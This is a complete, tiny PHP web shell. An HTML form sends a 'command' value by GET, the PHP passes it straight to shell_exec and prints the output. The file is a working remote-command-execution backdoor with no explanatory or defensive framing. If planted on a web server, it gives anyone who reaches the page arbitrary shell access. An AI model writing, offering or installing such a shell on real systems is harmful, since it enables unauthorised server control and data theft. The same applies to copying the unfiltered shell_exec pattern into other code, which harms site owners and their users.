<form method="GET">
    <p>Command: <input type="text" name="command"></p>
    <input type="submit" value="Run">
</form>
<?php
    if(isset($_GET["command"])){
        $out = shell_exec($_GET["command"]);
        echo "<pre>" . $out . "</pre>";
    }
?>